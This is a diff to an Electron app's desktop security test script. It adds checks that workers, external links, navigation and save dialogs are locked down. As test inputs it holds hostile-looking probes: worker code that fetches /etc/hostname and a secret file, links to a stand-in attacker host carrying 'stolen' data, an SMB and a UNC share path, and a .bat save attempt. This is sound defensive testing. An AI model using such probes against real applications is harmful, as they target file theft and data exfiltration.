@@ -11,10 +11,14 @@
  * violations / Electron security warnings.
  *
  *   npx vite build && xvfb-run -a -s "-screen 0 1600x960x24" node scripts/electron-desktop-check.mjs \
- *     [--out shot.png] [--tmp dir] [--full]
+ *     [--out shot.png] [--tmp dir] [--full] [--app dir]
  *
  * --full also opens every template/panel, drags every tool and runs every safe command inside Electron
  * (the browser smoke test's coverage, but under the app's real CSP and file:// origin).
+ * --app runs a copy of the app (a folder with electron/, package.json, dist/ and build/) instead of the repo.
+ * The last phase also runs the app from an install folder named like "100% Art #1 ?q Ünï 25%ad" and checks
+ * that the editor loads and its IPC is trusted there. Packaged-only behaviour (VITE_DEV_SERVER_URL ignored,
+ * fuses, asar) is checked by scripts/electron-packaged-check.mjs.
  * Linux only (isolates userData with XDG_CONFIG_HOME). Exit code 1 on any failure.
  */
 import { _electron as electron } from 'playwright-core';
@@ -22,7 +26,7 @@ import fs from 'node:fs';
 import os from 'node:os';
 import path from 'node:path';
 import { execFileSync, spawn } from 'node:child_process';
-import { fileURLToPath } from 'node:url';
+import { fileURLToPath, pathToFileURL } from 'node:url';
 import { createRequire } from 'node:module';
 
 const root = path.join(path.dirname(fileURLToPath(import.meta.url)), '..');
@@ -35,6 +39,8 @@ const arg = (k, d) => {
 };
 const out = arg('out', 'electron-desktop-check.png');
 const full = !!arg('full', false);
+/** The app folder to launch (electron/, package.json, dist/, build/): the repo by default, or a copy. */
+const appDir = typeof arg('app', null) === 'string' ? path.resolve(arg('app', null)) : root;
 const T = arg('tmp', null) || fs.mkdtempSync(path.join(os.tmpdir(), 'perseverance-desktop-'));
 fs.rmSync(T, { recursive: true, force: true });
 const FILES = path.join(T, 'files');
@@ -87,17 +93,19 @@ async function poll(fn, timeout = 8000, every = 150) {
 }
 
 /** Launch the app with main-process test doubles for native dialogs / shell. */
-async function launch(extraArgs = []) {
-  const app = await electron.launch({ executablePath: electronPath, args: [root, '--no-sandbox', ...extraArgs], env, cwd: T });
+async function launch(extraArgs = [], { dir = appDir, launchEnv = env } = {}) {
+  const app = await electron.launch({ executablePath: electronPath, args: [dir, '--no-sandbox', ...extraArgs], env: launchEnv, cwd: T });
   const exited = new Promise((r) => app.process().once('exit', (code) => r(code)));
   const page = await app.firstWindow();
   await app.evaluate(({ BrowserWindow, dialog, shell, ipcMain }) => {
-    const t = (globalThis.__t = { console: [], boxes: [], boxAnswers: [], saveQueue: [], saves: [], openQueue: [], external: [], revealed: [], ipc: [] });
+    const t = (globalThis.__t = { console: [], boxes: [], boxAnswers: [], saveQueue: [], saves: [], saveOpts: [], openQueue: [], external: [], revealed: [], ipc: [] });
     for (const ch of ['desktop:close-ack', 'desktop:confirm-close']) ipcMain.on(ch, (_e, v) => t.ipc.push(`${ch}=${v}@${Date.now()}`));
     const w = BrowserWindow.getAllWindows()[0];
     w.webContents.on('console-message', (e) => t.console.push({ level: e.level, message: e.message, source: e.sourceId }));
     dialog.showSaveDialog = async (...a) => {
-      t.saves.push((a.length > 1 ? a[1] : a[0])?.defaultPath ?? null);
+      const o = a.length > 1 ? a[1] : a[0];
+      t.saves.push(o?.defaultPath ?? null);
+      t.saveOpts.push(JSON.parse(JSON.stringify(o ?? {})));
       const p = t.saveQueue.shift();
       return p ? { canceled: false, filePath: p } : { canceled: true, filePath: '' };
     };
@@ -345,6 +353,71 @@ check(
   Object.entries(fileReads).every(([k, v]) => (k === 'fetchOwnBundle' ? v.startsWith('ALLOWED 200') : v.startsWith('blocked'))),
   fileReads,
 );
+
+/* ---- …nor through a Worker: worker requests never reach the main process' file:// filter, so the CSP
+ * (worker-src 'none') must stop every worker from starting at all ---- */
+const workerScript = path.join(FILES, 'probe-worker.js');
+fs.writeFileSync(workerScript, "postMessage('RAN outside-dist worker script');");
+const consoleBeforeWorkers = (await T_(app)).console.length;
+const workers = await page.evaluate(
+  async ({ secret, workerScript }) => {
+    const fileUrl = (p) => new URL(`file://${p}`).href;
+    // Each worker posts "started" first: any message at all means it ran (the load was not refused).
+    const body = `postMessage('started');
+      (async () => {
+        for (const u of ${JSON.stringify(['file:///etc/hostname', fileUrl(secret)])}) {
+          try { postMessage('READ ' + (await (await fetch(u)).text()).slice(0, 20)); } catch (e) { postMessage('fetch blocked ' + e.name); }
+        }
+      })();`;
+    const blob = (src) => URL.createObjectURL(new Blob([src], { type: 'text/javascript' }));
+    const watch = (target, start) =>
+      new Promise((res) => {
+        const got = [];
+        const done = (v) => {
+          clearTimeout(timer);
+          res(v);
+        };
+        const timer = setTimeout(() => done(got.length ? `RAN: ${got.join(' | ')}` : 'refused (never started)'), 2500);
+        target.onmessage = (e) => {
+          got.push(String(e.data));
+          if (got.length >= 3) done(`RAN: ${got.join(' | ')}`);
+        };
+        target.onerror = (e) => {
+          e?.preventDefault?.();
+          if (!got.length) done('refused (error event)');
+        };
+        start?.();
+      });
+    const attempt = async (make) => {
+      try {
+        return await make();
+      } catch (e) {
+        return `refused (${e.name})`;
+      }
+    };
+    return {
+      blobWorker: await attempt(() => watch(new Worker(blob(body)))),
+      blobModuleWorker: await attempt(() => watch(new Worker(blob(body), { type: 'module' }))),
+      fileWorkerOutsideDist: await attempt(() => watch(new Worker(fileUrl(workerScript)))),
+      sharedWorker: await attempt(() => {
+        const sw = new SharedWorker(blob(`onconnect = (c) => { const port = c.ports[0]; port.postMessage('started'); fetch(${JSON.stringify(fileUrl(secret))}).then((r) => r.text()).then((t) => port.postMessage('READ ' + t), (e) => port.postMessage('fetch blocked ' + e.name)); };`));
+        sw.onerror = (e) => sw.port.onerror?.(e);
+        return watch(sw.port, () => sw.port.start());
+      }),
+      serviceWorker: await attempt(async () => {
+        if (!navigator.serviceWorker) return 'refused (no API)';
+        await navigator.serviceWorker.register('./probe-sw.js');
+        return 'RAN: registered';
+      }),
+    };
+  },
+  { secret, workerScript },
+);
+await wait(300);
+// The refusals are logged as CSP errors on purpose: keep them out of the "no CSP violations / console
+// errors" checks below (any other worker the app itself tried to start would still show up there).
+const workerProbeConsole = new Set((await T_(app)).console.slice(consoleBeforeWorkers).filter((m) => /worker|probe-sw/i.test(m.message)).map((m) => m.message));
+check('the page cannot start workers (blob / module / outside-dist file / shared / service worker)', Object.values(workers).every((v) => v.startsWith('refused')), workers);
 await wait(200);
 t = await T_(app);
 check('showItemInFolder limited to chosen files / data folder', !t.revealed.includes('/etc/hostname'), t.revealed);
@@ -359,13 +432,15 @@ await queueSave(app, path.join(FILES, 'Resaved'));
 await page.evaluate(() => window.__app.commands.get('file.save').run());
 await poll(async () => fs.existsSync(path.join(FILES, 'Resaved.pgfx')));
 t = await T_(app);
-check('Save on a path without write access goes through Save As', fs.existsSync(path.join(FILES, 'Resaved.pgfx')) && sameBytes(legacy, poster) && t.saves.length === savesBefore + 1 && t.saves.at(-1) === legacy, { saves: t.saves.slice(savesBefore) });
+// The dialog starts from the document's name only: that path was never chosen in the app (no grant), so
+// the page may not pick the dialog's folder with it.
+check('Save on a path without write access goes through Save As', fs.existsSync(path.join(FILES, 'Resaved.pgfx')) && sameBytes(legacy, poster) && t.saves.length === savesBefore + 1 && t.saves.at(-1) === path.basename(legacy), { saves: t.saves.slice(savesBefore) });
 
 /* ---- second instance forwards (relative) argv ---- */
 const second = path.join(FILES, 'Second Copy.pgfx');
 fs.copyFileSync(poster, second);
 const t2 = Date.now();
-const child = spawn(electronPath, [root, path.relative(T, second), '--no-sandbox'], { cwd: T, env, stdio: 'ignore' });
+const child = spawn(electronPath, [appDir, path.relative(T, second), '--no-sandbox'], { cwd: T, env, stdio: 'ignore' });
 const childCode = await new Promise((r) => child.on('exit', r));
 const opened = await poll(async () => (await sessions(page)).find((s) => s.path === second), 10000);
 measurements.secondInstanceMs = Date.now() - t2;
@@ -383,7 +458,7 @@ await page.evaluate((p) => {
 await main(
   app,
   ({ app: eApp }, { file, cwd, exe, root }) => eApp.emit('second-instance', {}, [exe, root, file], cwd, { argv: [exe, root, file], cwd }),
-  { file: path.relative(T, second), cwd: T, exe: electronPath, root },
+  { file: path.relative(T, second), cwd: T, exe: electronPath, root: appDir },
 );
 const switched = await poll(
   () =>
@@ -405,7 +480,7 @@ fs.copyFileSync(poster, locked);
 await main(
   app,
   ({ app: eApp }, { file, cwd, exe, root }) => eApp.emit('second-instance', {}, [exe, root, file], cwd, { argv: [exe, root, file], cwd }),
-  { file: locked, cwd: T, exe: electronPath, root },
+  { file: locked, cwd: T, exe: electronPath, root: appDir },
 );
 const lockedOpen = await poll(async () => (await sessions(page)).find((s) => s.path === locked), 8000);
 const patched = await main(app, () => {
@@ -471,7 +546,7 @@ await main(
     wc.once('did-start-loading', () => eApp.emit('second-instance', {}, [exe, root, file], cwd, { argv: [exe, root, file], cwd }));
     wc.reload();
   },
-  { file: path.relative(T, during), cwd: T, exe: electronPath, root },
+  { file: path.relative(T, during), cwd: T, exe: electronPath, root: appDir },
 );
 await wait(500);
 await waitReady(page);
@@ -486,18 +561,25 @@ t = await T_(app);
 check('file forwarded during a reload opens once the page is ready', !!openedDuring && openedDuringFinal === 1 && t.loadingAtSend !== null, { opened: openedDuringFinal, loadingAtSend: t.loadingAtSend });
 
 /* ---- external links, popups, navigation ---- */
-await page.evaluate(() => {
+const EXTERNAL_OK = ['https://www.roblox.com/users/profile?username=Builderman', 'https://github.com/noxiryn/perseverance/releases', 'https://www.roblox.com/users/1/profile'];
+await page.evaluate((ok) => {
   const d = window.desktop;
   d.openExternal('file:///etc/passwd');
   d.openExternal('javascript:alert(1)');
   d.openExternal('smb://evil/share');
-  d.openExternal('https://example.com/ok');
-  window.open('https://example.org/popup');
+  d.openExternal('https://attacker.example/?d=stolen'); // any other site would carry data out
+  d.openExternal('http://www.roblox.com/users/1/profile'); // https only
+  d.openExternal('https://www.roblox.com.attacker.example/');
+  d.openExternal('https://github.com/attacker/repo');
+  d.openExternal(ok[0]); // the avatar dialog's profile button
+  d.openExternal(ok[1]);
+  window.open('https://attacker.example/popup?d=stolen');
   window.open('file:///etc/hostname');
-});
+  window.open(ok[2]);
+}, EXTERNAL_OK);
 await wait(600);
 t = await T_(app);
-check('openExternal / window.open only hand http(s) to the browser', JSON.stringify(t.external) === JSON.stringify(['https://example.com/ok', 'https://example.org/popup']), t.external);
+check('openExternal / window.open only hand the allow-listed https pages (Roblox, project page) to the browser', JSON.stringify(t.external) === JSON.stringify(EXTERNAL_OK), t.external);
 check('window.open never creates a window', (await windowCount(app)) === 1);
 
 /* ---- permissions ---- */
@@ -567,11 +649,54 @@ measurements.zoom = zoom;
 check('setZoomFactor zooms the page and the caption overlay follows', Math.abs(zoom.zoomed.dpr / zoom.before.dpr - 1.25) < 0.01 && zoom.reset === zoom.before.dpr && // env() is reported in whole CSS px: 39 DIP at 125% → 31.2 → 32 (an overlay stuck at 31 DIP would read 25).
   (zoom.before.overlay === 0 || (zoom.zoomed.overlay * 1.25 >= 38 && zoom.zoomed.overlay * 1.25 <= 41)), zoom);
 
+/* ---- the page can't choose the Save dialog's folder (UNC probe / NTLM leak) or an executable type ---- */
+const savesBeforeDlg = (await T_(app)).saves.length;
+for (const p of [null, null, null, path.join(FILES, 'run.bat')]) await queueSave(app, p); // the 4th dialog "presses Enter" on run.bat
+const dlgRes = await page.evaluate(
+  async ({ poster, files }) => {
+    const d = window.desktop;
+    const PGFX = [{ name: 'Perseverance Project', extensions: ['pgfx'] }];
+    const attempt = (o) =>
+      d.saveFile({ title: 'Save As', data: '@echo off', ...o }).then(
+        (r) => `dialog → ${r}`,
+        (e) => `refused: ${String(e.message).replace(/^Error invoking remote method '[^']+': /, '').slice(0, 80)}`,
+      );
+    return {
+      unc: await attempt({ defaultPath: '\\\\attacker\\share\\Poster.pgfx', filters: PGFX }),
+      ungrantedFolder: await attempt({ defaultPath: `${files}/Startup/Poster.pgfx`, filters: PGFX }),
+      granted: await attempt({ defaultPath: poster, filters: PGFX }),
+      mixedFilters: await attempt({ defaultPath: 'run.pgfx', filters: [{ name: 'P', extensions: ['pgfx', 'bat'] }, { name: 'Run', extensions: ['exe', 'lnk'] }] }),
+      bat: await attempt({ defaultPath: 'Poster.bat', filters: [{ name: 'Startup', extensions: ['bat'] }] }),
+      noFilters: await attempt({ defaultPath: 'Poster.hta' }),
+      wildcard: await attempt({ defaultPath: 'Poster.lnk', filters: [{ name: 'All files', extensions: ['*'] }] }),
+    };
+  },
+  { poster, files: FILES },
+);
+t = await T_(app);
+const dlgSeen = t.saveOpts.slice(savesBeforeDlg).map((o) => ({ defaultPath: o.defaultPath ?? null, exts: (o.filters ?? []).flatMap((f) => f.extensions) }));
+check(
+  'Save dialog: page paths cut to a file name (granted kept), only project/image/PSD types, none = refused',
+  JSON.stringify(dlgSeen) ===
+    JSON.stringify([
+      { defaultPath: 'Poster.pgfx', exts: ['pgfx'] },
+      { defaultPath: 'Poster.pgfx', exts: ['pgfx'] },
+      { defaultPath: poster, exts: ['pgfx'] },
+      { defaultPath: 'run.pgfx', exts: ['pgfx'] },
+    ]) &&
+    ['bat', 'noFilters', 'wildcard'].every((k) => dlgRes[k].startsWith('refused')) &&
+    dlgRes.mixedFilters === `dialog → ${path.join(FILES, 'run.bat.pgfx')}` &&
+    !fs.existsSync(path.join(FILES, 'run.bat')) &&
+    !fs.existsSync(path.join(FILES, 'Startup')),
+  { dlgRes, dlgSeen },
+);
+fs.rmSync(path.join(FILES, 'run.bat.pgfx'), { force: true });
+
 /* ---- large files ---- */
-await queueSave(app, path.join(FILES, 'big.bin'));
+await queueSave(app, path.join(FILES, 'big.pgfx'));
 const big = await page.evaluate(async () => {
   const d = window.desktop;
-  const p = await d.saveFile({ title: 'big', defaultPath: 'big.bin', filters: [{ name: 'All files', extensions: ['*'] }], data: 'x' });
+  const p = await d.saveFile({ title: 'big', defaultPath: 'big.pgfx', filters: [{ name: 'Perseverance Project', extensions: ['pgfx'] }], data: 'x' });
   const res = { path: p };
   for (const mb of [100, 300]) {
     const b = new Uint8Array(mb * 1024 * 1024);
@@ -588,8 +713,8 @@ const big = await page.evaluate(async () => {
   return res;
 });
 measurements.largeFiles = big;
-check('300 MB write/read round trip', big.ok100 && big.ok300 && sizeOf(path.join(FILES, 'big.bin')) === 300 * 1024 * 1024, big);
-fs.rmSync(path.join(FILES, 'big.bin'), { force: true });
+check('300 MB write/read round trip', big.ok100 && big.ok300 && sizeOf(path.join(FILES, 'big.pgfx')) === 300 * 1024 * 1024, big);
+fs.rmSync(path.join(FILES, 'big.pgfx'), { force: true });
 
 /* ---- close guard: dirty document → prompt → Cancel keeps the window ---- */
 await makeDirty(page);
@@ -838,9 +963,9 @@ const csp = await page.evaluate(() => window.__csp);
 t = await T_(app);
 const consoleAll = [...consoleA, ...t.console];
 // The file:// probes above fail on purpose (net::ERR_BLOCKED_BY_CLIENT): not app errors.
-const errors = consoleAll.filter((m) => m.level === 'error' && !PROBE_RE.test(`${m.message} ${m.source}`));
+const errors = consoleAll.filter((m) => m.level === 'error' && !PROBE_RE.test(`${m.message} ${m.source}`) && !workerProbeConsole.has(m.message));
 const secWarnings = consoleAll.filter((m) => /Electron Security Warning/i.test(m.message));
-const cspConsole = consoleAll.filter((m) => /Content Security Policy|Refused to/i.test(m.message));
+const cspConsole = consoleAll.filter((m) => /Content Security Policy|Refused to/i.test(m.message) && !workerProbeConsole.has(m.message));
 check('no CSP violations', csp.length === 0 && cspConsole.length === 0, [...csp, ...cspConsole.map((m) => m.message)].slice(0, 8));
 check('no Electron security warnings', secWarnings.length === 0, secWarnings.map((m) => m.message.slice(0, 120)));
 check('no renderer console errors', errors.length === 0, errors.map((m) => `${m.message.slice(0, 160)} (${m.source}:)`).slice(0, 10));
@@ -850,13 +975,22 @@ await page.evaluate(() => {
   location.href = 'file:///etc/hostname';
 });
 await wait(600);
+const externalBeforeNav = (await T_(app)).external.length;
 await page.evaluate(() => {
-  location.href = 'https://example.net/nav';
+  location.href = 'https://attacker.example/nav?d=stolen';
+});
+await wait(800);
+await page.evaluate(() => {
+  location.href = 'https://www.roblox.com/users/1/profile';
 });
 await wait(800);
 t = await T_(app);
 const href = await page.evaluate(() => location.href);
-check('the window never navigates away (http(s) goes to the browser)', /dist\/index\.html$/.test(href) && t.external.includes('https://example.net/nav') && (await page.evaluate(() => !!window.__app)), { href, external: t.external });
+check(
+  'the window never navigates away, and a navigation is never handed to the browser',
+  /dist\/index\.html$/.test(href) && t.external.length === externalBeforeNav && (await page.evaluate(() => !!window.__app)),
+  { href, external: t.external.slice(externalBeforeNav) },
+);
 
 /* ---- close again while the in-app prompt is open: a native way out after a moment ---- */
 await makeDirty(page);
@@ -905,5 +1039,76 @@ const logFile = path.join(userData, 'logs', 'main.log');
 const mainLog = fs.existsSync(logFile) ? fs.readFileSync(logFile, 'utf8') : '';
 check('main-process log written (crash + warnings recorded)', /render process gone/.test(mainLog) && /close request not acknowledged/.test(mainLog), logFile);
 check('blocked file:// requests are logged', /blocked file request file:\/\/\/etc\/hostname/.test(mainLog), logFile);
+check('refused links and navigations are logged', /blocked external url https:\/\/attacker\.example/.test(mainLog) && /blocked navigation https:\/\/attacker\.example/.test(mainLog), logFile);
+
+/* ======================================================================== */
+/* Phase D: installed in a folder with URL-special characters                */
+/* ======================================================================== */
+// Windows profile names may contain '%' (per-user installs and the portable exe's %TEMP% live under the
+// profile folder), and the NSIS installer lets users pick any folder. Electron's loadFile() left '%'
+// unescaped, so the file:// filter refused the app's own index.html (blank window, IPC refused).
+const instDir = path.join(T, 'inst', '100% Art #1 ?q Ünï 25%ad x%41y', 'Perseverance');
+fs.mkdirSync(instDir, { recursive: true });
+for (const part of ['electron', 'dist', 'build', 'package.json']) {
+  const from = path.join(appDir, part);
+  if (!fs.existsSync(from)) continue;
+  try {
+    execFileSync('cp', ['-al', from, instDir]); // hard links: fast, same bytes
+  } catch {
+    fs.cpSync(from, path.join(instDir, part), { recursive: true });
+  }
+}
+const CFG_D = path.join(T, 'cfg-d');
+fs.mkdirSync(CFG_D, { recursive: true });
+({ app, page, exited } = await launch([], { dir: instDir, launchEnv: { ...env, XDG_CONFIG_HOME: CFG_D } }));
+const loadedD = await page
+  .waitForFunction(() => !!window.__app && !!document.querySelector('.shell-root'), null, { timeout: 30000 })
+  .then(() => true, () => false);
+const pctInfo = await page.evaluate(async () => {
+  const r = { href: location.href };
+  try {
+    r.userData = await window.desktop.userDataPath(); // IPC is only answered for the trusted app page
+  } catch (e) {
+    r.userData = `ERR ${e.message}`;
+  }
+  const tryFetch = (u) => fetch(u).then((x) => `ALLOWED ${x.status}`, (e) => `blocked ${e.name}`);
+  r.ownBundle = await tryFetch(new URL('./favicon.png', location.href).href);
+  r.systemFile = await tryFetch('file:///etc/hostname');
+  r.outside = await tryFetch(new URL('../package.json', location.href).href);
+  return r;
+}).catch((e) => ({ err: e.message }));
+let hrefPathD = null;
+try {
+  hrefPathD = fileURLToPath(pctInfo.href);
+} catch {
+  /* not a file URL (chrome-error://…) */
+}
+check(
+  'installed under "100% Art #1 ?q Ünï 25%ad x%41y": the editor loads, IPC is trusted, the bundle filter still holds',
+  loadedD && hrefPathD === path.join(instDir, 'dist', 'index.html') && /%25/.test(pctInfo.href) && !String(pctInfo.userData).startsWith('ERR') && pctInfo.ownBundle === 'ALLOWED 200' && pctInfo.systemFile.startsWith('blocked') && pctInfo.outside.startsWith('blocked'),
+  { loadedD, ...pctInfo },
+);
+if (loadedD) await openTemplate(page); // lazy chunks + fonts load from the same folder
+const userDataD = path.join(CFG_D, 'Perseverance');
+const logD = () => (fs.existsSync(path.join(userDataD, 'logs', 'main.log')) ? fs.readFileSync(path.join(userDataD, 'logs', 'main.log'), 'utf8') : '');
+const ownBlocked = logD()
+  .split('\n')
+  .filter((l) => /blocked file request/.test(l) && l.includes('/inst/') && !/package\.json/.test(l));
+check('no request for the app\'s own files was blocked there (lazy chunks, fonts, images)', loadedD && ownBlocked.length === 0 && !/did-fail-load/.test(logD()), ownBlocked.slice(0, 3));
+
+/* ---- a page that fails to load says so (no silent blank window) and "Try Again" brings it back ---- */
+const boxesD = (await T_(app)).boxes.length;
+await answerBox(app, 0); // "Try Again"
+await main(app, ({ BrowserWindow }, url) => void BrowserWindow.getAllWindows()[0].webContents.loadURL(url).catch(() => {}), pathToFileURL(path.join(instDir, 'dist', 'missing.html')).href);
+const failBox = await poll(async () => (await T_(app)).boxes.slice(boxesD).find((b) => /could not be loaded/.test(b.message)), 8000);
+const backD = await poll(() => page.evaluate(() => !!(window.__app && document.querySelector('.shell-root')) && location.href.endsWith('/index.html')).catch(() => false), 20000, 300);
+check('a failed page load shows an error naming the log (Try Again / Quit), and Try Again reloads the editor', !!failBox && failBox.buttons.join() === 'Try Again,Quit' && !!backD, { failBox, backD });
+
+await page.evaluate(() => window.__app.useUI.setState({ dialogs: [] })).catch(() => {});
+const tCloseD = Date.now();
+await closeWindow(app).catch(() => {});
+const codeD = await Promise.race([exited, wait(8000).then(() => 'timeout')]);
+check('the window closes at once there (close-ack accepted from the page)', codeD !== 'timeout' && Date.now() - tCloseD < 4000, { exitCode: codeD, ms: Date.now() - tCloseD });
+if (codeD === 'timeout') await app.close().catch(() => {});
 
 finish();
